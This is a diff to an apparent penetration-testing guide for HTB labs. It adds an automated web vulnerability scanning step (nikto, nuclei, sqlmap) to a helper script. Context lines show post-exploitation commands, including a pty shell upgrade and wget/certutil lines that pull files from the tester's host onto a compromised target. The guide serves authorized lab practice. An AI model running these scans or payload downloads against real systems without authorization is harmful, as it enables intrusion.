@@ -5,13 +5,14 @@ Only run this against machines you're authorized to test (HTB labs or your own s
 
 > Quick start with the companion script (full details in `boxer-howto.md`):
 > ```
-> ./boxer.sh install                 # tools + AutoRecon + PEASS-ng + RootHound
+> ./boxer.sh install                 # tools + AutoRecon + PEASS-ng + RootHound + nuclei
 > ./boxer.sh roothound               # (background) auto-graph privesc from linPEAS uploads
 > ./boxer.sh workspace blue          # prompt IP -> /etc/hosts -> offers to run AutoRecon
 > ```
 > While AutoRecon runs, `websurface` flags web entry points (uploads/logins/POST)
-> into `~/htb/blue/web-attack-surface.txt`. After you get a shell, run linPEAS on
-> the target and upload it to `~/htb/blue/loot/` — `roothound` builds the graph.
+> into `~/htb/blue/web-attack-surface.txt`. After discovery, `webscan` runs nikto +
+> nuclei + sqlmap for active vulnerability scanning. After you get a shell, run
+> linPEAS on the target and upload it to `~/htb/blue/loot/` — `roothound` builds the graph.
 
 ---
 
@@ -60,8 +61,35 @@ nikto -host http://<ip>
 - Test login forms for default creds and SQLi.
 - Look for LFI/RFI, file upload, SSTI, IDOR, exposed `.git`/backups.
 - Hunt for leaked secrets in pages, JS, and JSON (creds, API keys, tokens):
-  `./boxer.sh secrets <ip> <box>` — automated crawl + regex scan
-  (this is the "find valuable info in Burp" job; Burp Community can't be scripted).
+  `./boxer.sh secrets <ip> <box>` — automated crawl + regex scan.
+- **Active vulnerability scan** — nikto + nuclei + sqlmap in one command:
+  `./boxer.sh webscan <ip> <box>` (see below).
+
+### Web vulnerability scanning (automated)
+
+`./boxer.sh webscan` is the closest free equivalent to Burp Suite's active scanner.
+Run it after initial recon; it chains three tools in sequence:
+
+```bash
+./boxer.sh webscan 10.10.10.40 blue       # bare IP
+./boxer.sh webscan http://blue.htb blue   # or full URL
+```
+
+| Stage | Tool | What it finds |
+|-------|------|---------------|
+| 1 | **nikto** | Server misconfigs, default/dangerous files, outdated software, missing headers |
+| 2 | **nuclei** | CVEs matched to the detected tech stack (Apache/PHP/IIS/WordPress/etc.), known exposures and misconfigurations |
+| 3 | **sqlmap** | SQL injection (prompted — crawls 3 levels, non-aggressive) |
+
+nuclei uses `-automatic-scan` — it fingerprints the stack with Wappalyzer and loads
+only the relevant templates, so it's targeted rather than a kitchen-sink blast.
+Results land in `~/htb/<box>/webscan/`. Run it **alongside** `secrets` for full coverage:
+
+```bash
+./boxer.sh webscan  <ip> <box>    # active vuln scan
+./boxer.sh secrets  <ip> <box>    # passive: leaked creds/tokens in pages/JS/headers
+./boxer.sh exploits <box>         # offline: known Exploit-DB entries for fingerprinted services
+```
 
 ---
 
@@ -97,7 +125,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
   shell. HTTP (best if FTP is blocked): `./boxer.sh http` then on the target
   `wget http://<you>/<file>` / `certutil -urlcache -split -f http://<you>/<file> f`.
   Anonymous FTP: `./boxer.sh ftp` then `wget ftp://<you>/<file>`; `FTP_WRITE=1`
-  lets the box upload loot back. The menu's option 9 prompts HTTP vs FTP.
+  lets the box upload loot back. The menu's option 12 prompts HTTP vs FTP.
 
 ---
 
